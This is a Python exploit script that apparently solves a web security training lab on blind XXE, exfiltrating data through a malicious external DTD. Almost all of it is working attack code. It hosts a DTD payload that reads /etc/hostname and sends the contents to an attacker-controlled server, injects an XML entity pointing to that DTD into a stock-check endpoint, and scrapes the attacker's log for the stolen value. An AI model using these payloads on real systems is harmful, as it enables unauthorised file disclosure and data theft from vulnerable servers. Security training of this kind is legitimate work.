# Exploiting blind XXE to exfiltrate data using a malicious external DTD

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def deliver_payload(s, url, payload, attacker):
	post_exploit_path = attacker + '/'
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/exploit.dtd",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r1 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(2)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/exploit.dtd",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r2 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % post_exploit_path)
	return r2

def store_exploit(s, url, attacker):
	payload = """<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '""" + attacker + """/?f=%file;'>">
%eval;
%exfil;
"""
	r = deliver_payload(s, url, payload, attacker)
	time.sleep(1)
	return r

def submit_hostname(s, url, hostname):
	print('[+] Trying to submit the hostname to solve the lab...')
	submit_path = url + '/submitSolution'
	submit_data = {"answer": hostname}
	r = s.post(submit_path, data=submit_data)
	return r

def get_hostname_xxe(s, url, attacker, payload):
	check_stock_path = url + '/product/stock'
	if payload == "SOLUTION":
		exploit_body = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Gwyo [ <!ENTITY % xxe SYSTEM \"""" + attacker + """/exploit.dtd"> %xxe;]><stockCheck><productId>15</productId><storeId>3</storeId></stockCheck>"""
	else:
		exploit_body = payload
	print('\n[+] Using payload:\n%s' % exploit_body)
	headers = {"Content-Type": "application/xml"}
	r = s.post(check_stock_path, data=exploit_body, headers=headers)
	time.sleep(2)
	res = r.text
	print(res)
	r = s.get(attacker + '/log')
	time.sleep(1)
	file_string = re.search("/?f=(.*) HTTP", r.text).group(1)
	print('[+] Found /etc/hostname file:\n%s' % file_string)
	return file_string

def show_usage():
	print('[+] Usage: %s <URL> <ATTACKER> <PAYLOAD>\n' % sys.argv[0])
	print('[+] Example: %s https://www.target.com anything.oastify.com $(cat payload03.xml)' % sys.argv[0])
	print('[+] Example: %s https://www.target.com anything.oastify.com SOLUTION' % sys.argv[0])
	sys.exit(-1)

def main():
	print('[+] Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD')
	try:
		url = sys.argv[1].strip()
		attacker = sys.argv[2].strip()
		input_payload = sys.argv[3:]
		if len(input_payload) > 1:
			payload = ' '.join(input_payload).replace('> ', '>').replace('=>', '=> ')
		else:
			payload = ''.join(input_payload)
		if payload == '':
			show_usage()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies # Comment this line to disable proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			print("[+] Trying to store exploit.dtd file on the exploit-server...")
			r = store_exploit(s, url, attacker)
			time.sleep(2)
			print("[+] Trying to send a XXE attack to force the target to send the content of /etc/hostname...")
			hostname = get_hostname_xxe(s, url, attacker, payload)
			time.sleep(1)
			r = submit_hostname(s, url, hostname)
			time.sleep(2)
			r = s.get(url, allow_redirects=False)
			time.sleep(1)
			if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
			elif r.status_code == 200:
				print('[+] The Exploit sent the given payload !')
	except requests.exceptions.ProxyError:
		print('\n[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
